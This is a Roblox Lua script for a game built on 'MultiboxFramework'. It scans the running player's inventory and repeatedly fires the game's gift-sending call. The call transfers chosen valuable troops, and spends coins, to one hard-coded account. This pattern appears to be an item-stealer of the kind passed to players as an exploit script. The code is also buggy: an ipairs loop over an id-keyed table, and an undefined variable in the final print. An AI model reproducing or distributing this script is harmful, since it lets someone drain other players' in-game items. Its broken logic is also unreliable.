local users = {
    "HobinhrOrPf",
}

local troopsToSend = {
    "SantaTVMan",
    "LuckySpeakerman",
    "ClockSpider",
    "GuardianClockman",
}

local TTD
local Network
local Invoke
local Fire

task.spawn(function()
    TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)

    repeat
        pcall(function()
            Network = TTD.Network
            Invoke = Network.Invoke
            Fire = Network.Fire
        end)
        task.wait(0.1)
    until Network ~= nil and Invoke ~= nil and Fire ~= nil

    -- Move Invoke and Fire assignments here after Network is initialized
    Invoke = Network.Invoke
    Fire = Network.Fire
end)

local invTroops = {}

function getInventoryTroops()
    invTroops = {}
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for name, v in pairs(save._data.Inventory.Troops) do
        for i, troopId in ipairs(v) do
            invTroops[troopId] = name
        end
    end
    return invTroops
end

local coins

function getCoinAmt()
    coins = 0
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for i, v in pairs(save._data) do
        if i == "Currencies" then
            coins = v.Coins
        end
    end
    return coins
end

function hasTroop(id)
    local troops = getInventoryTroops()
    for i, v in pairs(troops) do
        if i == id then
            return true
        end
    end
    return false
end

local startAmt = getCoinAmt()

for i, user in ipairs(users) do
    local sent = {}
    for i, troopId in ipairs(getInventoryTroops()) do
        local troopName = invTroops[troopId]
        if table.find(troopsToSend, troopName) and not table.find(sent, troopName) then
            table.insert(sent, troopName)
            local oldC = getCoinAmt()
            local st = tick()
            repeat
                local success, result = pcall(function()
                    Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", troopId, 0, tostring(math.random(1, 10000)))
                end)
                task.wait(0.1)
            until getCoinAmt() < oldC and not hasTroop(troopId)
            print("sent", "time taken:", tick() - st)
        end
    end
    print('finished user:', user)
end

print('Should have sent:', amt)
